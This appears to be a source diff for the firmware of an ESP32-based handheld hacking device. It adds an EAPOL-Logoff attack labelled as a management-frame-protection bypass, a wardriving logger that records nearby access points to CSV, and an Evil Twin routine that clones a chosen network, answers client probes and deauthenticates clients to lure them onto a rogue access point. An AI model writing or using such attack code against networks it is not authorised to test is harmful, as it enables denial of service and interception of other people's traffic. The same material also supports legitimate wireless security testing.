@@ -26,6 +26,7 @@
 #include "esp_at_list.h"
 #include "m1_compile_cfg.h"
 #include "m1_system.h"
+#include "ff.h"
 
 #ifdef M1_APP_WIFI_CONNECT_ENABLE
 #include "m1_wifi_cred.h"
@@ -2129,6 +2130,7 @@ static bool wifi_attack_target_actions(uint8_t idx)
 		WIFI_ATK_ACT_BEACON_CLONE,
 		WIFI_ATK_ACT_PROBE_SNIFF,
 		WIFI_ATK_ACT_KARMA,
+		WIFI_ATK_ACT_EAPOLLOGOFF,
 		WIFI_ATK_ACT_REMOVE,
 		WIFI_ATK_ACT_COUNT
 	};
@@ -2167,6 +2169,8 @@ static bool wifi_attack_target_actions(uint8_t idx)
 				option_label = "Probe Sniff";
 			else if (row == WIFI_ATK_ACT_KARMA)
 				option_label = "Karma";
+			else if (row == WIFI_ATK_ACT_EAPOLLOGOFF)
+				option_label = "EAPOL-Logoff";
 			else if (row == WIFI_ATK_ACT_REMOVE)
 				option_label = "Remove Target";
 			else
@@ -2345,6 +2349,19 @@ static bool wifi_attack_target_actions(uint8_t idx)
 					wifi_display_msg("Karma", "Start failed");
 					vTaskDelay(pdMS_TO_TICKS(1500));
 				}
+			}
+			else if (selected == WIFI_ATK_ACT_EAPOLLOGOFF)
+			{
+				wifi_display_panel("EAPOL-Logoff",
+					s_attack_targets[idx].bssid,
+					"Sending EAPOL",
+					"frames (PMF bypass)");
+				if (wifi_esp_eapollogoff(s_attack_targets[idx].bssid,
+				                         s_attack_targets[idx].channel) == SUCCESS)
+					wifi_display_msg("EAPOL-Logoff", "Sent!");
+				else
+					wifi_display_msg("EAPOL-Logoff", "Failed/Unsupported");
+				vTaskDelay(pdMS_TO_TICKS(1500));
 			}
 			else if (selected == WIFI_ATK_ACT_REMOVE)
 			{
@@ -3029,6 +3046,305 @@ void wifi_deauth_flood(void)
 				wifi_esp_deauth_stop(); active = false;
 				mode = MODE_INPUT;
 			}
+		}
+	}
+}
+
+/*============================================================================*/
+/**
+  * @brief Wardrive: scan all nearby APs and log to WiGLE-format CSV on SD card.
+  *        Each run creates a new file: 0:/WARDRIVE/wd_NNNN.csv
+  *        Press BACK to stop.
+  */
+/*============================================================================*/
+void wifi_wardrive(void)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	ctrl_cmd_t app_req = CTRL_CMD_DEFAULT_REQ();
+	FIL file;
+	bool file_open = false;
+	uint16_t total_aps = 0;
+	uint16_t scan_num = 0;
+	char filepath[48];
+	UINT bw;
+
+	if (!wifi_ensure_esp32_ready()) {
+		wifi_display_msg("ESP32", "not ready!");
+		vTaskDelay(pdMS_TO_TICKS(2000));
+		return;
+	}
+
+	f_mkdir("0:/WARDRIVE");
+
+	/* Find next available file number */
+	{
+		FILINFO fno;
+		uint16_t fn = 1;
+		for (; fn < 9999U; fn++) {
+			snprintf(filepath, sizeof(filepath), "0:/WARDRIVE/wd_%04u.csv", fn);
+			if (f_stat(filepath, &fno) != FR_OK) break;
+		}
+	}
+
+	if (f_open(&file, filepath, FA_WRITE | FA_CREATE_NEW) == FR_OK) {
+		const char *h1 =
+			"WigleWifi-1.4,appRelease=M1PPER,model=M1PPER,release=1.0,"
+			"device=M1PPER,display=M1PPER,board=M1PPER,brand=Monstatek\r\n";
+		const char *h2 =
+			"MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,"
+			"CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\r\n";
+		f_write(&file, h1, strlen(h1), &bw);
+		f_write(&file, h2, strlen(h2), &bw);
+		f_sync(&file);
+		file_open = true;
+	}
+
+	static char wd_seen[128][18];
+	static uint16_t wd_seen_count;
+	memset(wd_seen, 0, sizeof(wd_seen));
+	wd_seen_count = 0;
+
+	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
+
+	for (;;) {
+		scan_num++;
+		char ln[24];
+
+		m1_u8g2_firstpage();
+		m1_draw_header_bar(&m1_u8g2, "Wardrive",
+		                   file_open ? (filepath + 10) : "No SD card");
+		m1_draw_content_frame(&m1_u8g2, 2, 14, 124, 35);
+		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+		snprintf(ln, sizeof(ln), "APs:%u  Scan#%u", total_aps, scan_num);
+		m1_draw_text(&m1_u8g2, 8, 28, 114, ln, TEXT_ALIGN_LEFT);
+		m1_draw_text(&m1_u8g2, 8, 40, 114, "Scanning...", TEXT_ALIGN_LEFT);
+		m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Stop", NULL, NULL);
+		m1_u8g2_nextpage();
+
+		wifi_free_scan_results(&app_req);
+		app_req = (ctrl_cmd_t)CTRL_CMD_DEFAULT_REQ();
+
+		if (wifi_run_scan(&app_req, 1)) {
+			wifi_ap_scan_list_t *scan = &app_req.u.wifi_ap_scan;
+			for (uint16_t i = 0; i < scan->count && scan->out_list != NULL; i++) {
+				wifi_scanlist_t *ap = &scan->out_list[i];
+				const char *bssid = (const char *)ap->bssid;
+
+				bool seen = false;
+				for (uint16_t j = 0; j < wd_seen_count; j++) {
+					if (strncmp(wd_seen[j], bssid, 17) == 0) { seen = true; break; }
+				}
+				if (seen) continue;
+
+				if (wd_seen_count < 128U)
+					strncpy(wd_seen[wd_seen_count++], bssid, 17);
+				total_aps++;
+
+				if (file_open) {
+					const char *auth;
+					switch (ap->encryption_mode) {
+						case WIFI_AUTH_OPEN:             auth = "[ESS]"; break;
+						case WIFI_AUTH_WEP:              auth = "[WEP][ESS]"; break;
+						case WIFI_AUTH_WPA_PSK:          auth = "[WPA-PSK][ESS]"; break;
+						case WIFI_AUTH_WPA2_PSK:         auth = "[WPA2-PSK][ESS]"; break;
+						case WIFI_AUTH_WPA_WPA2_PSK:     auth = "[WPA-PSK][WPA2-PSK][ESS]"; break;
+						case WIFI_AUTH_WPA3_PSK:         auth = "[WPA3-SAE][ESS]"; break;
+						case WIFI_AUTH_WPA2_ENTERPRISE:  auth = "[WPA2-EAP][ESS]"; break;
+						default:                         auth = "[ESS]"; break;
+					}
+					char ssid_safe[33];
+					strncpy(ssid_safe, (const char *)ap->ssid, 32);
+					ssid_safe[32] = '\0';
+					for (uint8_t k = 0; k < 32U && ssid_safe[k]; k++)
+						if (ssid_safe[k] == ',') ssid_safe[k] = ' ';
+
+					char row[192];
+					snprintf(row, sizeof(row),
+					         "%s,%s,%s,2000-01-01 00:00:00,%d,%d,"
+					         "0.000000,0.000000,0,0,WIFI\r\n",
+					         bssid, ssid_safe, auth, ap->channel, ap->rssi);
+					f_write(&file, row, strlen(row), &bw);
+					f_sync(&file);
+				}
+			}
+		}
+
+		m1_u8g2_firstpage();
+		m1_draw_header_bar(&m1_u8g2, "Wardrive",
+		                   file_open ? (filepath + 10) : "No SD card");
+		m1_draw_content_frame(&m1_u8g2, 2, 14, 124, 35);
+		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+		snprintf(ln, sizeof(ln), "APs:%u  Scan#%u", total_aps, scan_num);
+		m1_draw_text(&m1_u8g2, 8, 28, 114, ln, TEXT_ALIGN_LEFT);
+		m1_draw_text(&m1_u8g2, 8, 40, 114, "Next: 30s  BACK=stop", TEXT_ALIGN_LEFT);
+		m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Stop", NULL, NULL);
+		m1_u8g2_nextpage();
+
+		bool stop = false;
+		TickType_t t0 = xTaskGetTickCount();
+		while ((xTaskGetTickCount() - t0) < pdMS_TO_TICKS(30000U)) {
+			if (xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(200U)) == pdTRUE &&
+			    q_item.q_evt_type == Q_EVENT_KEYPAD &&
+			    xQueueReceive(button_events_q_hdl, &btn, 0) == pdTRUE &&
+			    (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK ||
+			     btn.event[BUTTON_LEFT_KP_ID] == BUTTON_EVENT_CLICK)) {
+				stop = true;
+				break;
+			}
+		}
+		if (stop) break;
+	}
+
+	if (file_open) f_close(&file);
+	wifi_free_scan_results(&app_req);
+	xQueueReset(main_q_hdl);
+
+	char result[24];
+	snprintf(result, sizeof(result), "%u APs logged", total_aps);
+	wifi_display_msg("Wardrive done", result);
+	vTaskDelay(pdMS_TO_TICKS(3000U));
+}
+
+
+/*============================================================================*/
+/**
+  * @brief Evil Twin: clone a nearby AP (beacon + karma + deauth) to pull
+  *        clients off the real network and onto our rogue AP.
+  *        Select target from scan, then BACK to stop all attacks.
+  */
+/*============================================================================*/
+void wifi_evil_twin(void)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	BaseType_t ret;
+	ctrl_cmd_t app_req = CTRL_CMD_DEFAULT_REQ();
+	uint8_t tgt_channel = 6;
+	char tgt_ssid[33] = "";
+	char tgt_bssid[18] = "";
+
+	if (!wifi_ensure_esp32_ready()) {
+		wifi_display_msg("ESP32", "not ready!");
+		vTaskDelay(pdMS_TO_TICKS(2000));
+		return;
+	}
+
+	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
+
+	wifi_display_panel("Evil Twin", "Scanning for", "target APs...", "Please wait");
+	if (!wifi_run_scan(&app_req, M1_WIFI_SCAN_ATTEMPTS)) {
+		wifi_display_msg("Evil Twin", "Scan failed");
+		vTaskDelay(pdMS_TO_TICKS(2000));
+		wifi_free_scan_results(&app_req);
+		return;
+	}
+
+	wifi_ap_scan_list_t *scan = &app_req.u.wifi_ap_scan;
+	if (scan->count == 0 || scan->out_list == NULL) {
+		wifi_display_msg("Evil Twin", "No APs found");
+		vTaskDelay(pdMS_TO_TICKS(2000));
+		wifi_free_scan_results(&app_req);
+		return;
+	}
+
+	/* Target picker */
+	uint16_t sel = 0;
+	while (1) {
+		wifi_scanlist_t *ap = &scan->out_list[sel];
+		const char *ssid_str = (ap->ssid[0] == 0) ? "*hidden*" : (const char *)ap->ssid;
+		char ln[24];
+
+		m1_u8g2_firstpage();
+		m1_draw_header_bar(&m1_u8g2, "Evil Twin", "Select target");
+		m1_draw_content_frame(&m1_u8g2, 2, 14, 124, 35);
+		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+		snprintf(ln, sizeof(ln), "%u/%u", (unsigned)(sel + 1U), (unsigned)scan->count);
+		m1_draw_text(&m1_u8g2, 8, 24, 114, ln, TEXT_ALIGN_LEFT);
+		{
+			char ssid_tr[22];
+			strncpy(ssid_tr, ssid_str, 21); ssid_tr[21] = '\0';
+			m1_draw_text(&m1_u8g2, 8, 34, 114, ssid_tr, TEXT_ALIGN_LEFT);
+		}
+		snprintf(ln, sizeof(ln), "Ch:%d  RSSI:%ddBm", ap->channel, ap->rssi);
+		m1_draw_text(&m1_u8g2, 8, 44, 114, ln, TEXT_ALIGN_LEFT);
+		m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Back", "Clone", NULL);
+		m1_u8g2_nextpage();
+
+		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
+		if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;
+		xQueueReceive(button_events_q_hdl, &btn, 0);
+
+		if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK ||
+		    btn.event[BUTTON_LEFT_KP_ID] == BUTTON_EVENT_CLICK) {
+			wifi_free_scan_results(&app_req);
+			xQueueReset(main_q_hdl);
+			return;
+		}
+		if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
+			sel = (sel == 0U) ? (uint16_t)(scan->count - 1U) : (uint16_t)(sel - 1U);
+		if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK) {
+			sel++;
+			if (sel >= scan->count) sel = 0;
+		}
+		if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK ||
+		    btn.event[BUTTON_RIGHT_KP_ID] == BUTTON_EVENT_CLICK) {
+			strncpy(tgt_ssid, (ap->ssid[0] == 0) ? "" : (const char *)ap->ssid, 32);
+			tgt_ssid[32] = '\0';
+			strncpy(tgt_bssid, (const char *)ap->bssid, 17);
+			tgt_bssid[17] = '\0';
+			tgt_channel = (uint8_t)ap->channel;
+			break;
+		}
+	}
+
+	wifi_free_scan_results(&app_req);
+
+	if (tgt_ssid[0] == '\0') {
+		wifi_display_msg("Evil Twin", "Hidden SSID - skip");
+		vTaskDelay(pdMS_TO_TICKS(2000));
+		xQueueReset(main_q_hdl);
+		return;
+	}
+
+	/* Start rogue AP: clone beacon + respond to probes + deauth real AP clients */
+	const char *ssids[1] = { tgt_ssid };
+	bool bt_ok    = (wifi_esp_beacon_start(ssids, 1, tgt_channel) == SUCCESS);
+	bool karma_ok = bt_ok && (wifi_esp_karma_start(tgt_channel) == SUCCESS);
+	if (bt_ok)
+		wifi_esp_deauth_start(tgt_bssid, tgt_channel, NULL, 0);
+
+	while (1) {
+		char ssid_tr[22];
+		strncpy(ssid_tr, tgt_ssid, 21); ssid_tr[21] = '\0';
+		char ln[24];
+
+		m1_u8g2_firstpage();
+		m1_draw_header_bar(&m1_u8g2, "Evil Twin",
+		                   bt_ok ? "ACTIVE" : "Start failed");
+		m1_draw_content_frame(&m1_u8g2, 2, 14, 124, 35);
+		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+		m1_draw_text(&m1_u8g2, 8, 24, 114, ssid_tr, TEXT_ALIGN_LEFT);
+		snprintf(ln, sizeof(ln), "Ch:%u  Deauth+Beacon", tgt_channel);
+		m1_draw_text(&m1_u8g2, 8, 34, 114, ln, TEXT_ALIGN_LEFT);
+		m1_draw_text(&m1_u8g2, 8, 44, 114,
+		             karma_ok ? "Karma: ON" : "Karma: OFF", TEXT_ALIGN_LEFT);
+		m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Stop", NULL, NULL);
+		m1_u8g2_nextpage();
+
+		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
+		if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;
+		xQueueReceive(button_events_q_hdl, &btn, 0);
+
+		if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK ||
+		    btn.event[BUTTON_LEFT_KP_ID] == BUTTON_EVENT_CLICK) {
+			if (bt_ok) {
+				wifi_esp_deauth_stop();
+				wifi_esp_beacon_stop();
+				if (karma_ok) wifi_esp_karma_stop();
+			}
+			xQueueReset(main_q_hdl);
+			return;
 		}
 	}
 }
